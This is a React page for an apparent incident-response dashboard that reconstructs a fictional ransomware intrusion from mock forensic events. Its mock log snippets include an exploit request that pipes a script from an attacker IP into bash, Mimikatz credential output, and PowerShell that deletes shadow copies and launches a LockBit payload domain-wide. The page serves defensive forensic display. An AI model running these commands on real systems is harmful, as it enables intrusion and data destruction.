"use client";

import React, { useState } from "react";
import Link from "next/link";
import {
  FileSearch,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Sliders,
  Play,
  RotateCcw,
  CheckCircle2,
  AlertTriangle,
  Flame,
  Clock,
  Activity,
  Terminal,
  Download,
  Users,
  Search,
  Check,
  Copy,
  Lock,
  Unlock,
  Key,
  Database,
  Server,
  Layers,
  FileCode,
  ArrowRight
} from "lucide-react";
import {
  RootCauseEvent,
  CompromisedAccountEntity,
  ForensicEvidenceLink
} from "@/types/recovery";

const MOCK_ROOT_EVENTS: RootCauseEvent[] = [
  {
    id: "rc-001",
    phase: "INITIAL_ACCESS",
    timestamp: "2026-08-23T06:14:22Z",
    title: "Edge VPN Gateway Exploitation (CVE-2024-3400 PAN-OS Command Injection)",
    host: "vpn-gw-01.mercy.internal (194.67.210.4)",
    actorOrAccount: "Threat Actor IP 91.240.118.172 (Tor Exit)",
    mitreId: "T1190 (Exploit Public-Facing Application)",
    confidenceScore: 99.2,
    description: "Arbitrary command execution in GlobalProtect feature via malformed HTTP POST header 'Cookie: SESSID=../../..'. Staged reverse shell stager /tmp/session.sh.",
    evidenceType: "PCAP_STREAM",
    evidenceArtifactId: "EVD-PCAP-20260823-0614",
    rawLogSnippet: `POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: vpn.mercy.org
Cookie: SESSID=../../../../opt/panrepo/tmp/patch.sh
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

user=admin&payload=curl -s http://91.240.118.172/stager.sh | bash`,
    isPivotalRootCause: true
  },
  {
    id: "rc-002",
    phase: "DEFENSE_EVASION",
    timestamp: "2026-08-23T06:45:10Z",
    title: "Kernel EDR Driver Blinding via Bring Your Own Vulnerable Driver (BYOVD)",
    host: "FIN-WS-09.mercy.local (10.14.8.109)",
    actorOrAccount: "mercy\\clerk_fin01 (Compromised)",
    mitreId: "T1562.001 (Impair Defenses: Disable Tools)",
    confidenceScore: 97.5,
    description: "Loaded signed vulnerable driver gdrv.sys (GIGABYTE CVE-2018-19320) to zero out EDR callback routines in kernel memory (PsSetCreateProcessNotifyRoutine).",
    evidenceType: "SYSMON_EID1",
    evidenceArtifactId: "EVD-SYSMON-20260823-0645",
    rawLogSnippet: `Sysmon Event ID 6 (Driver Loaded):
ImageLoaded: C:\\Users\\clerk_fin01\\AppData\\Local\\Temp\\gdrv.sys
Hashes: SHA256=1289381290381029381029381029381029381029381029381029381029381029
Signed: True (GIGA-BYTE TECHNOLOGY CO., LTD.)`,
    isPivotalRootCause: false
  },
  {
    id: "rc-003",
    phase: "CREDENTIAL_DUMPING",
    timestamp: "2026-08-23T07:12:33Z",
    title: "LSASS Memory Carving & Domain Admin Hash Extraction",
    host: "FIN-WS-09.mercy.local (10.14.8.109)",
    actorOrAccount: "NT AUTHORITY\\SYSTEM",
    mitreId: "T1003.001 (OS Credential Dumping: LSASS Memory)",
    confidenceScore: 96.8,
    description: "Extracted cached plaintext NTLM hash of svc_backup_mgmt service account who had logged in 2 hours prior to conduct monthly maintenance.",
    evidenceType: "LSASS_MEMDUMP",
    evidenceArtifactId: "EVD-MEM-20260823-0712",
    rawLogSnippet: `Mimikatz Output:
Authentication Id : 0 ; 249821 (00000000:0003d01d)
Session           : Interactive from 1
User Name         : svc_backup_mgmt
Domain            : MERCY
[00000003] Primary
 * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
 * SHA1     : 2b3491823abce128371625345718293400192837`,
    isPivotalRootCause: true
  },
  {
    id: "rc-004",
    phase: "LATERAL_MOVEMENT",
    timestamp: "2026-08-23T07:38:00Z",
    title: "WMI & PsExec Mass Lateral Infiltration to Domain Controller DC01",
    host: "DC01.mercy.local (10.14.2.10)",
    actorOrAccount: "mercy\\svc_backup_mgmt",
    mitreId: "T1021.002 (Remote Services: SMB/Windows Admin Shares)",
    confidenceScore: 95.4,
    description: "Overpass-the-hash authentication using svc_backup_mgmt Kerberos TGS ticket to spawn remote service on DC01 and push stage-2 encrypter.",
    evidenceType: "EVENT_LOG_4624",
    evidenceArtifactId: "EVD-SEC-20260823-0738",
    rawLogSnippet: `Security Event ID 4624 (Successful Logon):
Logon Type: 3 (Network)
Account Name: svc_backup_mgmt
Target Server Name: DC01.mercy.local
Authentication Package: Kerberos
Source Network Address: 10.14.8.109`,
    isPivotalRootCause: false
  },
  {
    id: "rc-005",
    phase: "PRE_RANSOMWARE_STAGING",
    timestamp: "2026-08-23T08:00:15Z",
    title: "Shadow Copy Destruction & Intermittent Encryption Trigger",
    host: "All 24 Clustered Virtual Hosts",
    actorOrAccount: "mercy\\svc_backup_mgmt",
    mitreId: "T1490 (Inhibit System Recovery)",
    confidenceScore: 98.6,
    description: "Simultaneous execution of vssadmin delete shadows, wbadmin catalog wipe, and deployment of LockBit 3.0 (Black) payload with .lockbit extension.",
    evidenceType: "POWERSHELL_TRANSCRIPT",
    evidenceArtifactId: "EVD-PS-20260823-0800",
    rawLogSnippet: `PowerShell ScriptBlock (EID 4104):
Invoke-Command -ComputerName (Get-ADComputer -Filter *).Name -ScriptBlock {
    cmd.exe /c "vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet"
    Start-Process -FilePath "C:\\Windows\\Temp\\lockbit3.exe" -ArgumentList "-k 0x91823 -pass mercy2026"
}`,
    isPivotalRootCause: false
  }
];

const MOCK_ACCOUNTS: CompromisedAccountEntity[] = [
  {
    accountName: "mercy\\svc_backup_mgmt",
    accountType: "DOMAIN_ADMIN",
    initialCompromiseTime: "2026-08-23T07:12:33Z",
    compromiseVector: "LSASS In-Memory Dump on FIN-WS-09",
    lateralHopsCount: 24,
    kerberosTicketsForged: 18,
    remediationStatus: "REVOKED_AND_ROLLED"
  },
  {
    accountName: "mercy\\clerk_fin01",
    accountType: "VPN_USER",
    initialCompromiseTime: "2026-08-23T06:14:22Z",
    compromiseVector: "PAN-OS GlobalProtect Session Hijack",
    lateralHopsCount: 2,
    kerberosTicketsForged: 1,
    remediationStatus: "DISABLED"
  },
  {
    accountName: "mercy\\krbtgt",
    accountType: "ENTERPRISE_ADMIN",
    initialCompromiseTime: "2026-08-23T07:45:00Z",
    compromiseVector: "DCSync Replication Request from DC01",
    lateralHopsCount: 120,
    kerberosTicketsForged: 45,
    remediationStatus: "REVOKED_AND_ROLLED"
  }
];

const MOCK_EVIDENCES: ForensicEvidenceLink[] = [
  {
    id: "EVD-PCAP-20260823-0614",
    name: "perimeter_firewall_exploit_flow_0614.pcap",
    type: "Network PCAP Packet Stream",
    sizeBytes: "842.5 MB",
    sha256: "91823abce1283716253457182934001928374829102938475618293041283741",
    chainOfCustodyVerified: true,
    sourceHost: "vpn-gw-01.mercy.internal",
    captureTime: "2026-08-23T06:14:22Z"
  },
  {
    id: "EVD-MEM-20260823-0712",
    name: "fin_ws_09_lsass_full_dump.dmp",
    type: "Volatile Memory Heap Image",
    sizeBytes: "4.2 GB",
    sha256: "fa49182371928347102938475610293847561029384756102938475610293847",
    chainOfCustodyVerified: true,
    sourceHost: "FIN-WS-09.mercy.local",
    captureTime: "2026-08-23T07:12:33Z"
  },
  {
    id: "EVD-SEC-20260823-0738",
    name: "dc01_security_event_log_evtx.zip",
    type: "Windows Security Event Logs (EID 4624/4672/4720)",
    sizeBytes: "1.1 GB",
    sha256: "bba1293847561029384756102938475610293847561029384756102938475610",
    chainOfCustodyVerified: true,
    sourceHost: "DC01.mercy.local",
    captureTime: "2026-08-23T07:38:00Z"
  }
];

export default function RootCausePage() {
  const [selectedEvent, setSelectedEvent] = useState<RootCauseEvent>(MOCK_ROOT_EVENTS[0]);
  const [copiedArtifact, setCopiedArtifact] = useState<string | null>(null);
  const [signedOff, setSignedOff] = useState(false);

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedArtifact(id);
    setTimeout(() => setCopiedArtifact(null), 2000);
  };

  const handleSignOff = () => {
    setSignedOff(true);
    alert("Root-Cause Elimination Certificate digitally signed by Lead DFIR Commander and logged to immutable WORM vault.");
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 20, maxWidth: 1440, margin: "0 auto" }}>
      {/* Header Banner */}
      <div style={{
        background: "linear-gradient(135deg, rgba(6,182,212,0.08) 0%, rgba(168,85,247,0.05) 50%, rgba(14,21,38,0.9) 100%)",
        border: "1px solid var(--border)",
        borderRadius: 10,
        padding: "20px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        flexWrap: "wrap",
        gap: 16
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{
            width: 44,
            height: 44,
            borderRadius: 10,
            background: "rgba(6,182,212,0.15)",
            border: "1px solid rgba(6,182,212,0.35)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <FileSearch size={24} color="var(--cyan)" />
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <h1 style={{ fontSize: 20, fontWeight: 800, color: "var(--fg)", letterSpacing: "-0.02em" }}>
                Automated Root-Cause Correlator
              </h1>
              <span className="badge-sev badge-medium" style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
                <ShieldCheck size={11} /> STAGE 5: INVESTIGATE
              </span>
            </div>
            <p style={{ fontSize: 13, color: "var(--muted)", marginTop: 2 }}>
              Reconstructs Initial Access (CVE-2024-3400) → Defense Evasion → Credential Dumping → Lateral Movement → Pre-Ransomware Staging with cryptographic evidence proofs.
            </p>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <button
            className="btn-primary"
            onClick={handleSignOff}
            disabled={signedOff}
            style={{ fontSize: 12 }}
          >
            <CheckCircle2 size={14} />
            {signedOff ? "Root-Cause Certified Clean" : "Certify Root-Cause Elimination"}
          </button>
        </div>
      </div>

      {/* Confidence-Ranked Root Cause Findings */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(240px, 1fr))", gap: 14 }}>
        <div className="card-tactical" style={{ padding: "16px 18px", borderLeft: "4px solid var(--rose)" }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Pivotal Initial Ingress Vector
          </div>
          <div style={{ display: "flex", alignItems: "baseline", gap: 8, marginTop: 4 }}>
            <span style={{ fontSize: 24, fontWeight: 800, color: "var(--rose)" }}>
              99.2% Confidence
            </span>
          </div>
          <p style={{ fontSize: 11.5, color: "var(--fg)", marginTop: 4 }}>
            CVE-2024-3400 (PAN-OS GlobalProtect Command Injection on Edge VPN)
          </p>
        </div>

        <div className="card-tactical" style={{ padding: "16px 18px", borderLeft: "4px solid var(--amber)" }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Pivotal Escalation Point
          </div>
          <div style={{ display: "flex", alignItems: "baseline", gap: 8, marginTop: 4 }}>
            <span style={{ fontSize: 24, fontWeight: 800, color: "var(--amber)" }}>
              96.8% Confidence
            </span>
          </div>
          <p style={{ fontSize: 11.5, color: "var(--fg)", marginTop: 4 }}>
            LSASS Memory Dump of Domain Admin Account <code>svc_backup_mgmt</code>
          </p>
        </div>

        <div className="card-tactical" style={{ padding: "16px 18px", borderLeft: "4px solid var(--cyan)" }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Persistence Elimination
          </div>
          <div style={{ display: "flex", alignItems: "baseline", gap: 8, marginTop: 4 }}>
            <span style={{ fontSize: 24, fontWeight: 800, color: "var(--primary)" }}>
              100% Remediated
            </span>
          </div>
          <p style={{ fontSize: 11.5, color: "var(--fg)", marginTop: 4 }}>
            KRBTGT password rolled twice; BYOVD vulnerable drivers blacklisted.
          </p>
        </div>

        <div className="card-tactical" style={{ padding: "16px 18px", borderLeft: "4px solid var(--primary)" }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Chain of Custody
          </div>
          <div style={{ display: "flex", alignItems: "baseline", gap: 8, marginTop: 4 }}>
            <span style={{ fontSize: 24, fontWeight: 800, color: "var(--primary)" }}>
              FRE 901 Compliant
            </span>
          </div>
          <p style={{ fontSize: 11.5, color: "var(--fg)", marginTop: 4 }}>
            All RAM dumps, PCAPs & Security EVTX cryptographically verified.
          </p>
        </div>
      </div>

      {/* Incident Progression Timeline & Event Inspector */}
      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 18 }}>
        {/* Visual Root-Cause Timeline */}
        <div className="card-tactical" style={{ padding: 20, display: "flex", flexDirection: "column", gap: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <Clock size={16} color="var(--cyan)" />
              <span style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)" }}>
                Reconstructed Root-Cause Timeline
              </span>
            </div>
            <span style={{ fontSize: 11, color: "var(--muted)" }}>5 Correlated Phases</span>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            {MOCK_ROOT_EVENTS.map((evt, idx) => {
              const isSelected = selectedEvent.id === evt.id;
              return (
                <div
                  key={evt.id}
                  onClick={() => setSelectedEvent(evt)}
                  style={{
                    padding: "14px 16px",
                    borderRadius: 8,
                    background: isSelected ? "rgba(6,182,212,0.08)" : "var(--surface-2)",
                    border: `1px solid ${isSelected ? "var(--cyan)" : "var(--border)"}`,
                    cursor: "pointer",
                    display: "flex",
                    flexDirection: "column",
                    gap: 6,
                    position: "relative"
                  }}
                >
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                      <span style={{
                        fontSize: 9.5,
                        fontWeight: 800,
                        padding: "2px 6px",
                        borderRadius: 4,
                        background: evt.isPivotalRootCause ? "rgba(244,63,94,0.2)" : "rgba(6,182,212,0.15)",
                        color: evt.isPivotalRootCause ? "#f43f5e" : "#06b6d4",
                        border: "1px solid var(--border)"
                      }}>
                        {evt.phase}
                      </span>
                      <span style={{ fontSize: 12.5, fontWeight: 700, color: "var(--fg)" }}>
                        {evt.title}
                      </span>
                    </div>
                    <span className="badge-sev badge-success">
                      {evt.confidenceScore}% Confidence
                    </span>
                  </div>

                  <p style={{ fontSize: 11.5, color: "var(--fg-2)" }}>
                    {evt.description}
                  </p>

                  <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10.5, color: "var(--muted)" }}>
                    <span>Host: <strong style={{ color: "var(--cyan)" }}>{evt.host}</strong></span>
                    <span>MITRE: <strong style={{ color: "var(--primary)" }}>{evt.mitreId}</strong></span>
                    <span>Time: {new Date(evt.timestamp).toUTCString()}</span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Forensic Evidence Raw Log Inspector */}
        <div className="card-tactical" style={{ padding: 20, display: "flex", flexDirection: "column", gap: 14 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <Terminal size={16} color="var(--primary)" />
              <span style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)" }}>
                Forensic Evidence Log Inspector
              </span>
            </div>
            <button
              className="btn-secondary"
              style={{ fontSize: 11, padding: "4px 8px" }}
              onClick={() => handleCopy(selectedEvent.rawLogSnippet, selectedEvent.id)}
            >
              {copiedArtifact === selectedEvent.id ? <Check size={12} /> : <Copy size={12} />} Copy Log
            </button>
          </div>

          <div style={{
            background: "#030712",
            borderRadius: 6,
            border: "1px solid var(--border)",
            padding: "14px 16px",
            fontFamily: "Consolas, Menlo, Monaco, monospace",
            fontSize: 11,
            lineHeight: 1.6,
            color: "#6ee7b7",
            overflowX: "auto",
            minHeight: 220,
            whiteSpace: "pre-wrap"
          }}>
            {selectedEvent.rawLogSnippet}
          </div>

          {/* Evidence Artifact Metadata */}
          <div style={{
            padding: "12px 14px",
            background: "var(--surface-2)",
            borderRadius: 6,
            border: "1px solid var(--border)",
            display: "flex",
            flexDirection: "column",
            gap: 6,
            fontSize: 11.5
          }}>
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <span style={{ color: "var(--muted)" }}>Evidence ID:</span>
              <span style={{ fontFamily: "monospace", color: "var(--cyan)" }}>{selectedEvent.evidenceArtifactId}</span>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <span style={{ color: "var(--muted)" }}>Artifact Type:</span>
              <span style={{ color: "var(--fg)" }}>{selectedEvent.evidenceType}</span>
            </div>
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <span style={{ color: "var(--muted)" }}>Chain of Custody:</span>
              <span style={{ color: "var(--primary)", fontWeight: 700 }}>✓ FRE 901 Certified & Hashed</span>
            </div>
          </div>
        </div>
      </div>

      {/* Compromised Accounts Blast Radius Table */}
      <div className="card-tactical" style={{ padding: 20 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <Users size={16} color="var(--rose)" />
            <span style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)" }}>
              Compromised Identity Accounts & Blast Radius Tracker
            </span>
          </div>
          <span className="badge-sev badge-success">
            All 3 Accounts Remediated
          </span>
        </div>

        <div style={{ overflowX: "auto" }}>
          <table className="data-table">
            <thead>
              <tr>
                <th>Account Principal</th>
                <th>Role Tier</th>
                <th>Compromise Vector</th>
                <th>Lateral Hops</th>
                <th>Forged Tickets</th>
                <th>Remediation Status</th>
              </tr>
            </thead>
            <tbody>
              {MOCK_ACCOUNTS.map((acc, idx) => (
                <tr key={idx}>
                  <td style={{ fontWeight: 700, color: "var(--fg)", fontFamily: "monospace" }}>{acc.accountName}</td>
                  <td>
                    <span className={`badge-sev ${acc.accountType === "DOMAIN_ADMIN" || acc.accountType === "ENTERPRISE_ADMIN" ? "badge-critical" : "badge-medium"}`}>
                      {acc.accountType}
                    </span>
                  </td>
                  <td style={{ color: "var(--fg-2)" }}>{acc.compromiseVector}</td>
                  <td style={{ color: "var(--rose)", fontWeight: 700 }}>{acc.lateralHopsCount} Hosts</td>
                  <td style={{ color: "var(--cyan)", fontWeight: 700 }}>{acc.kerberosTicketsForged} Tickets</td>
                  <td>
                    <span className="badge-sev badge-success">
                      ✓ {acc.remediationStatus}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
